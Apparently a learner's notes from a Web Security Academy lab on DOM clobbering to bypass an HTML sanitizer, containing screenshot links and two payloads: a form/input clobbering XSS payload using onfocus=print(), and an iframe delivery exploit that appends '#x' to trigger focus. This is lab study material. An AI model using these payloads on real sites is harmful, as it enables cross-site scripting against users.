# EXPERT: Clobbering DOM attributes to bypass HTML filters

![Снимок экрана 2025-12-01 в 12.07.13.png](EXPERT%20Clobbering%20DOM%20attributes%20to%20bypass%20HTML%20fi/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-01_%D0%B2_12.07.13.png)

![Снимок экрана 2025-12-01 в 12.11.20.png](EXPERT%20Clobbering%20DOM%20attributes%20to%20bypass%20HTML%20fi/%D0%A1%D0%BD%D0%B8%D0%BC%D0%BE%D0%BA_%D1%8D%D0%BA%D1%80%D0%B0%D0%BD%D0%B0_2025-12-01_%D0%B2_12.11.20.png)

```jsx
<form id=x tabindex=0 onfocus=print()><input id=attributes>
```

```jsx
<iframe src=https://YOUR-LAB-ID.web-security-academy.net/post?postId=3 onload="setTimeout(()=>this.src=this.src+'#x',500)">
```